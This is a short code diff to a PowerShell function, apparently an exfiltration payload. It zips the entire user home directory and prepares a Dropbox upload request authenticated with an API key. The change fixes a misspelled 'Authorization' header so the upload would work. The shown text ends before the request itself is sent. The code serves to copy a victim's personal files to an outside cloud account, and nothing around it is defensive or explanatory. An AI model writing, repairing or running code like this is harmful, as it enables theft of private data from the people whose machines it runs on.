@@ -1,12 +1,11 @@
 function sacar{
   param([String]$APIKey)
-  # ref: https://www.dropbox.com/developers/documentation/http/documentation#files-upload
   
   $Out = "$env:LOCALAPPDATA\Temp\Home.zip"
   Compress-Archive -Path $env:HOMEPATH -DestinationPath $Out
   $arg = '{ "path": "/home.zip", "mode": "add", "autorename": true, "mute": false }'
   $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
-  $headers.Add("Autorization", "Bearer $APIKey")
+  $headers.Add("Authorization", "Bearer $APIKey")
   $headers.Add("Dropbox-API-Arg", $arg)
   $headers.Add("Content-Type", 'application/octet-stream')
   
